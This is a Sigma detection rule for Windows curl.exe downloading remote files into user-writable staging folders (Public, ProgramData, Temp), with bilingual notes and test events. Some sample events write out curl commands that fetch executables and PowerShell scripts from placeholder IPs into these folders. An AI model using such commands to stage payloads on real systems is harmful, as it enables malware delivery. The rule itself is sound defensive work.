---
title: Curl Download Saved To A User-Writable Staging Directory
summary: |-
  Detects the built-in Windows curl.exe downloading a remote file and writing it into a directory any user can write to (Public, ProgramData, Temp).
  Attackers use the curl that ships with Windows 10 and later to pull second-stage payloads without bringing their own downloader.
sigma_id: b5c572b7-be5a-445e-94fd-aa4c46723624
status: experimental
level: medium
platform: windows
logsource: windows / process_creation
tactics:
  - TA0011
techniques:
  - T1105
author: FLAMINGOFF
date: '2026-11-27'
falsepositives:
  - Installer, packaging or update scripts that stage files in ProgramData or Temp with curl
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/curl
source:
  name: Blue Team Library
  url: https://github.com/FLAMINGOFF/blueteam-library/blob/main/src/content/rules/btl_win_curl_download_to_staging_dir.md
  license: Original
format: Sigma
original: true
title_zh: curl 下载文件并保存到所有用户可写的暂存目录
summary_zh: 检测 Windows 自带的 curl.exe 下载远程文件，并写入任何用户都可写的目录（Public、ProgramData、Temp）。攻击者常用系统自带的 curl 拉取第二阶段载荷，不必自带下载器。
notes_zh: 调优建议：先统计一周内环境里 curl 的正常用法，把已知的安装/更新脚本按父进程或命令行加入排除项；保存为 .exe/.dll/.ps1 的情况可单独提高严重度。
notes_en: >-
  Tuning: baseline a week of normal curl usage and exclude known installer or update scripts by parent process or command line. Consider raising severity when the output file ends in .exe, .dll or
  .ps1.
samples:
  - name:
      zh: 下载到 Public 目录
      en: Download into Public
    expect: true
    event:
      EventID: 1
      Image: C:\Windows\System32\curl.exe
      OriginalFileName: curl.exe
      CommandLine: curl -s -o C:\Users\Public\svc.exe https://203.0.113.10/a/svc.exe
      ParentImage: C:\Windows\System32\cmd.exe
      User: CORP\j.smith
  - name:
      zh: 用斜杠参数写到 %TEMP%
      en: Slash-style flag into %TEMP%
    expect: true
    event:
      EventID: 1
      Image: C:\Windows\System32\curl.exe
      OriginalFileName: curl.exe
      CommandLine: curl.exe http://198.51.100.7/stage.ps1 /o %TEMP%\stage.ps1
      ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  - name:
      zh: 下载到项目目录（正常）
      en: Download into a project folder (benign)
    expect: false
    event:
      EventID: 1
      Image: C:\Windows\System32\curl.exe
      OriginalFileName: curl.exe
      CommandLine: curl -L -o D:\dev\api\openapi.json https://api.example.com/openapi.json
      ParentImage: C:\Program Files\Git\bin\bash.exe
  - name:
      zh: 只检查连通性，不写文件
      en: Connectivity check
      no output file: null
    expect: false
    event:
      EventID: 1
      Image: C:\Windows\System32\curl.exe
      CommandLine: curl -I https://www.example.com
---

```yaml
title: Curl Download Saved To A User-Writable Staging Directory
id: b5c572b7-be5a-445e-94fd-aa4c46723624
status: experimental
description: |
  Detects the built-in Windows curl.exe downloading a remote file and writing it into a directory any user can write to (Public, ProgramData, Temp).
  Attackers use the curl that ships with Windows 10 and later to pull second-stage payloads without bringing their own downloader.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/curl
author: FLAMINGOFF
date: 2026-11-27
tags:
  - attack.command-and-control
  - attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\curl.exe'
    - OriginalFileName: 'curl.exe'
  selection_remote:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'
  selection_output:
    CommandLine|contains|windash:
      - ' -o '
      - ' --output '
  selection_dir:
    CommandLine|contains:
      - '\Users\Public\'
      - '\ProgramData\'
      - '\AppData\Local\Temp\'
      - '\Windows\Temp\'
      - '%PUBLIC%'
      - '%TEMP%'
      - '%ProgramData%'
  condition: all of selection_*
falsepositives:
  - Installer, packaging or update scripts that stage files in ProgramData or Temp with curl
level: medium
```
